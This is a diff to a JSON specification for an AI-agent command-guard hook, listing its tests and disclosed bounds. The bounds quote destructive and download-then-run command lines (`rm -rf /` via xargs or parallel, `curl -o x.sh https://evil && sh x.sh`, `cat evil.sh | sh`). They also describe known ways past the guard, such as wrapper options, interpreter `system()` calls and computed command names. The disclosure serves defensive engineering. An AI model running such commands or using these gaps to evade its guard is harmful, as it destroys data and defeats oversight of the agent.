+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_an_argument_judged_name_is_refused_under_every_unmodelled_option",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ParallelArgumentsTheGuardDoesNotModel.test_ordinary_names_stay_allowed"
+          },
+          "limitations": [
+            "Task 110 impl panel round 2, classes 1 and 2 (owner ruling 2026-10-05). Every command is GENERATED from the guard's own tables (`_ARGUMENT_JUDGED_HEADS` × `_PARALLEL_UNMODELLED_*`) and is harmless as written: an ordinary name and the plain argument `x`. 1,224 commands, every one allowed by the panel-time tree (RED recorded in the task record, `measure/red-r2.txt`).",
+            "Corpus (the owner's bash history, 33,782 unique commands, 149 naming `parallel`): the rule refuses 0; guard verdicts changed against the panel-time tree: 0 either way."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_every_name_is_refused_under_an_option_that_hides_the_template",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "A renamed source separator or a user-defined replacement string: the guard cannot tell which words are the template, so the invocation is refused whatever the command (672 generated commands)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_an_argument_judged_name_is_refused_with_a_rewriting_replacement_string",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ParallelArgumentsTheGuardDoesNotModel.test_argument_judged_names_stay_allowed_under_every_modelled_option"
+          },
+          "limitations": [
+            "The control runs the same names under EVERY option the tables model and with the verbatim replacement strings: all allowed, so the rule is keyed on the unmodelled form, not on the name."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_a_name_the_guard_cannot_read_is_refused",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "No template (the arguments are the commands), a replacement string where the name should be, a wrapper that re-parses a line with an argument in it."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_an_abbreviation_of_a_listed_option_is_that_option",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "GNU parallel accepts a unique prefix of a long option; a spelling no table knows is matched as a prefix of the listed ones. An option no table knows at all is NOT treated as rewriting: it is not listed, and it keeps the two readings it had (control inside `test_argument_judged_names_stay_allowed_under_every_modelled_option`)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_a_job_that_blocks_on_its_own_keeps_its_own_rule",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "The general refusal is the LAST payload, so a job that blocks on its own still names its own rule."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_every_name_in_the_table_has_a_rule_that_reads_its_arguments",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "`_ARGUMENT_JUDGED_HEADS` is `rm`, `git`, `dd`, the shells and `_DB_CLIENTS`; the SQL rule's pattern is built from that client table."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_the_bound_an_optional_value_written_bare_may_swallow_the_name",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "A pinned OVER-block: an optional-value option written bare (`-l`, `--max-lines`) is read both ways; under the reading where it takes the command's name the template has no readable name, so the invocation is refused whatever the command. Writing the value removes it."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelLinkedSourcesAreCountedAsAProduct.test_the_bound",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 2, class 3 — a DECLARED BOUND (owner ruling 2026-10-05): 23 linked pairs are counted as 529 jobs and refused (`parallel-too-many-jobs`)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelArgumentsTheGuardDoesNotModel.test_a_download_runner_is_refused_after_a_download_when_its_operand_is_rewritten",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Post-D6 run 1 (codex, counted Important): the download-then-run rule reads a runner's OPERAND, so the runners (`_DL_RUNNERS` beyond the shells: `python`, `python3`, `perl`, `ruby`, `node`, `.`, `source`) are argument-judged by that one rule. Generated from that table × the unmodelled forms with the harmless argument `x`: 287 commands, all allowed by the panel-time tree. The controls are in the same test: no download, a modelled option, an ordinary name — all allowed, so an interpreter under a rewriting form is refused ONLY after a download."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2892,7 +3328,7 @@
         "Task 073 impl panel round 2, PARKED (codex-medium #3): `tasks tag` rewrites chat_log.md read-modify-write without coordinating with the appending hooks (chat-log, state-echo); a prompt appended during the rewrite is lost. Pre-existing; the lock/primitive class of task 058.",
         "Task 073 impl panel round 3, DISCLOSED/PARKED: (1) wrapper OPTIONS bypass the command-position rules (`sudo -u root …`, `env -i …`, `time -p …` — only bare wrappers are stripped); (2) a generic heredoc piped into a shell (`cat <<EOF | sh`) matches no rule — the pipe rule is downloader-specific by design; (3) the either-order DOTALL SQL rule can over-block a benign command that merely mentions a client and a destructive keyword (safe direction); (4) the irreversible-task acknowledgement resolves the lane through the best-effort journal resolver and reads pointer/status/risk without a lock — a stale root task or a concurrent switch could acknowledge against the wrong task; without PLAYBOOK_SESSION_ID (VS Code extension) it never fires (block stands). The pipe rule now also sees `sudo`/`env`/`command`/`nice`/`nohup` (with flags) before the interpreter, and the echo-line mask requires a single simple command. — SUPERSEDED BY TASK 077 for (1) and (2): (1) is FIXED (36 measured bypasses → 0: `_WRAPPERS` + `_walk_prefix` walk wrapper options on both the segment and the pipe path); (2) is now a RECORDED DECISION rather than an accidental gap — a generic `cat evil.sh | sh` stays allowed because a local file is not unambiguously unreviewed remote code and the guard cannot read it, with a one-line `dangerous_commands` opt-in documented in docs/configuration.md for projects that want the stricter rule.",
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_unknown_value_taking_option_hides_its_payload`): an option that takes a VALUE but is not in the wrapper's table leaves that value where the command would be, so the segment reads as safe. The same holds for a delegating wrapper the table does not list at all. This under-blocks — the direction a guard whose false positives a user cannot route around should fail in — and it is the price of never scanning past the command token (scanning would start blocking `sudo grep -rn \"rm -rf /\" /etc`).",
-        "Task 077 bound (pinned by `HonestBoundsArePinned.test_download_then_run_across_two_segments_is_out_of_scope`): download-then-run split across segments (`curl -o x.sh https://evil && sh x.sh`) is NOT caught. It needs cross-segment data-flow (track what a downloader wrote, flag a later execution of that path), a different analysis class from a prefix walk, and it carries a real over-block risk. Parked in task 077 for a task that can decide it on measured false-positive rates.",
+        "Task 077 bound MOVED in task 110 (owner Q-B (b), after measurement): download-then-run within ONE command line now blocks (`DownloadThenRunAcrossSegments`). Still out of scope, pinned by `DownloadThenRunBounds.test_bounds`: a file downloaded in an EARLIER tool call (no cross-call state), and a download-then-run inside a command substitution (`$( … )`) — the substitution scan also lifts backtick spans out of single quotes, where bash keeps them literal, and that quirk caused the one false positive measured when the rule ran there.",
         "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer.",
         "Task 077 accepted OVER-block (pinned by `SeparatorsAndSubstitutionsAreCommandPositions.test_known_conservative_over_block_is_pinned_not_hidden`): a SINGLE-quoted command substitution does not expand and is inert, but still blocks — the matcher is quote-blind by design. The documented escape is to write such a fixture inside a quoted `cat`/`tee` heredoc to a plain file, which the module already advises for the other whole-command rules. Chosen over silently allowing `echo \"$(rm -rf /)\"`, which really does delete.",
         "Task 077 impl panel round 1 produced 31 further vectors on the round-1 implementation, ALL confirmed by execution and all fixed. The lesson recorded rather than the symptom: this guard is a quote-blind pattern matcher over shell text, and 'find the command position' has a long tail (quoting, naming, separators, substitutions, verb-level options). The tail is now covered by one lexer and one naming function rather than by N normalisation sites, but the module remains pattern-based and the OS sandbox is still the only deterministic layer.",
@@ -2902,9 +3338,14 @@
         "Task 077 ARCHITECTURAL BOUND, pinned by `TheArchitecturalBound.test_a_computed_command_name_is_not_resolvable`: a command NAME that only exists after the shell evaluates something is out of reach for a static classifier — `alias x='<cmd>'; x`, `${X:-rm} …`, `$(echo rm) …`. These need the alias table, the variable environment, or the result of running an inner command. No amount of further parsing closes them; the OS sandbox is the layer that does.",
         "Task 077 SCOPE BOUND, pinned by `TheArchitecturalBound.test_a_different_RULE_FAMILY_is_out_of_scope_not_covered`: the interlock answers 'where is the command and is it one of the enumerated dangerous forms', not 'is this act destructive'. Measured as ALLOWED and disclosed rather than implied: an interpreter running a destructive command inside its own language (`perl -e 'system(…)'`, `python3 -c 'os.system(…)'`), a remote command (`ssh host …`), a container bind mount, and other deletion tools (`find -delete`, `rsync --delete`, `shred`). Each would be a NEW rule family with its own false-positive profile, and adding one is a scope decision for the owner, not a bug fix.",
         "Task 077 impl panel round 5 produced 14 defects, all confirmed and fixed. The signal CHANGED in this round and that is what ended the task: rounds 1-3 each showed the DESIGN was wrong; rounds 4 and 5 found regressions introduced by my own earlier fixes (the argv early-return, the echo mask, the computed-target rule) plus instances. That is an argument for fewer edits to this module, not for more review rounds — each further round of edits to the masking engine and the target rule has itself produced a regression. The residual surface is disclosed in the bounds above rather than implied to be empty.",
-        "Task 085 (measured): a target that only arrives at run time is not seen — on stdin to `xargs` (`echo / | xargs rm -rf`) or through `:::` into a quoted `parallel` template (`parallel 'rm -rf {}' ::: /`). The classifier judges the command, not the data it will be fed; the OS sandbox is the layer for that.",
+        "Task 085 (measured), narrowed by task 110: a target that only arrives at run time is not seen — on stdin to `xargs` (`echo / | xargs rm -rf`), or read by `parallel` from a FILE (`::::`, `-a FILE`; pinned by `ParallelInputArgumentsReachThePayload.test_the_bound_input_from_a_file_is_not_known`). Literal `:::` arguments are now composed into each job (task 110), so `parallel 'rm -rf {}' ::: /` blocks.",
         "Task 085 round 3 (U8): a globbed command name that matches a binary on disk is resolved only at run time, like the computed names already pinned in TheArchitecturalBound — added there.",
-        "Task 100 (PLAN S8 binding audit, 2026-09-27) NARROWED two clauses no test asserts: the journal reason `ack-irreversible-task:<rule>` written on the acknowledged allow (command_guard.py emits it; no test reads it back) and the `on` spelling of PLAYBOOK_ALLOW_DANGEROUS (accepted by `main`; GuardAckHygiene.test_falsey_env_values_do_not_acknowledge exercises 1/true/yes only). Both are S11 gauntlet items, not defects."
+        "Task 100 (PLAN S8 binding audit, 2026-09-27) NARROWED two clauses no test asserts: the journal reason `ack-irreversible-task:<rule>` written on the acknowledged allow (command_guard.py emits it; no test reads it back) and the `on` spelling of PLAYBOOK_ALLOW_DANGEROUS (accepted by `main`; GuardAckHygiene.test_falsey_env_values_do_not_acknowledge exercises 1/true/yes only). Both are S11 gauntlet items, not defects. — CLOSED by task 110: both clauses are asserted now (`IrreversibleAckReadsTheResolvedSession.test_no_env_id_an_irreversible_task_acknowledges` reads the `ack-irreversible-task:<rule>` row back; `OperatorAcknowledgementIsJournalled.test_every_documented_ack_spelling_is_journalled` exercises `on`).",
+        "Task 110, PARKED (measured, not fixed here): `_command_substitutions` takes a backtick span inside SINGLE quotes for a substitution although bash keeps it literal — so a quoted string such as an `eval '…'` argument that quotes a dangerous command in backticks is refused; the 4 corpus commands newly refused by the parallel fix go through it, and 1.5.45 refused them too. A quote-aware scan has to respect unquoted heredoc bodies (where `'` is a literal) — its own task, measured against the corpus.",
+        "Task 110 impl panel round 1 bound: GNU parallel's option table is read from its source (the `GetOptions` spec) and extended with later releases' value options by hand; an option neither knows is judged under both readings, so a future option can only make the guard block MORE. Past 16 option readings or 512 job lines the invocation is refused, not judged — a deliberate over-block.",
+        "Task 110 impl panel round 2, classes 1 and 2 (owner ruling 2026-10-05): GNU parallel's argument-rewriting grammar is deliberately NOT modelled. What the guard does not model is the DATA in command_guard.py (`_PARALLEL_UNMODELLED_*`, `_PARALLEL_REWRITING_REPL`, `_PARALLEL_HIDES_TEMPLATE_LONG`), and the rule that replaces a model is conservative by construction: it refuses on the command NAME. Its cost is an over-block — an argument-judged command (`rm`, `git`, `dd`, a shell, a database client) under one of those forms is refused even when its arguments are harmless, and needs the acknowledgement. Its bounds: the unmodelled set is exactly what the tables list (an option no table knows keeps its two readings and is not treated as rewriting); a name the rules do not judge by its arguments (`find`, an interpreter, a program of the project's own) passes whatever its rewritten arguments become; a redirection target built from a rewritten argument is not judged. Options that reach GNU parallel from OUTSIDE the command text (the `PARALLEL` environment variable, a profile file) are not seen at all, the same class as an alias. PROVENANCE (owner decision 2026-10-05): EVERY GNU parallel option table in command_guard.py — the option arities written in impl panel round 1 and the unmodelled lists written in round 2 — comes from documentation, with no GNU parallel binary installed on the machine where they were written; no table was run against the tool. One entry, `--match`, is from the model's memory of recent releases and is UNVERIFIED; it is marked as such in the table.",
+        "Task 110 impl panel round 2, class 3 — DECLARED BOUND (owner ruling 2026-10-05): linked input sources (`:::+`, `--link`) are counted as the full product of their values, not as the pairs GNU parallel runs, so an invocation with few real jobs can pass the 512 job-line cap and be refused (`parallel-too-many-jobs`). It errs toward safety — a refusal with an acknowledgement path, never an allow — and is pinned by `ParallelLinkedSourcesAreCountedAsAProduct.test_the_bound`.",
+        "Task 110 impl panel round 2, classes 4 and 5 — DECLARED BOUNDS of the download-then-run heuristic (owner ruling 2026-10-05): the rule follows a file from the segment that downloads it to the later segments and into what those delegate to. It does not carry a download made INSIDE a delegated payload (a `sh -c` body, an `eval`, wrapper or `parallel` payload) out to the later segments, and it reads the saved file's name only from an output option or from an operand that carries a URL scheme. Both are ALLOWS, and no test pins them (a pin would be the missed form written out). The rule shipped on owner decision Q-B (b) after it refused nothing in the bash history; it narrows a common mistake over one command's text and is not a containment layer. The real boundary for unreviewed remote code is the OS sandbox."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
@@ -12714,7 +13155,7 @@
     {
       "id": "PB-ENFORCEMENT-JOURNAL",
       "category": "hook-payload-and-paths",
-      "statement": "The enforcement hooks append a best-effort, log-only record of each decision to the lane-resolved .agent/<lane>/journal/enforcement.jsonl (root lane: .agent/journal/enforcement.jsonl). The `decision` field is one of {allow, block, record}: task-gate writes allow or block, command-guard/stop/batch-close write block, and the close path writes a `record` (hook=\"close\", decision=\"record\", reason=\"verify contract\") logging the verify bar that close ran — a forensic record, not a gate allow/block. A journal write failure never changes any enforcement decision, and the journal is never created outside an existing playbook-managed lane.",
+      "statement": "The enforcement hooks append a best-effort, log-only record of each decision to the lane-resolved .agent/<lane>/journal/enforcement.jsonl (root lane: .agent/journal/enforcement.jsonl). The `decision` field is one of {allow, block, record}: task-gate writes allow or block (including the Bash task-dir refusal — task 110), command-guard writes block, and allow for an acknowledged command (`ack-irreversible-task:<rule>`, `ack-operator-env:<rule>` — task 110), stop/batch-close write block, and the close path writes a `record` (hook=\"close\", decision=\"record\", reason=\"verify contract\") logging the verify bar that close ran — a forensic record, not a gate allow/block. A journal write failure never changes any enforcement decision, and the journal is never created outside an existing playbook-managed lane.",
       "owner": [
         {
           "path": "plugins/playbook/scripts/pb_journal.py",
@@ -12847,6 +13288,27 @@
           "limitations": [
             "Pins the close entry's decision=\"record\" (the third contract value) with the verify command in the `command` field; the negative control proves a wedged journal never blocks the close."
           ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardFixBatch110.test_the_block_is_journalled",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Task 110 (109 G2-13): Guard 2's refusal had no journal line."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "OperatorAcknowledgementIsJournalled.test_env_ack_writes_an_allow_line_naming_the_rule",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "OperatorAcknowledgementIsJournalled.test_env_ack_on_a_harmless_command_writes_nothing"
+          },
+          "limitations": []
         }
       ],
       "applicable_platforms": [
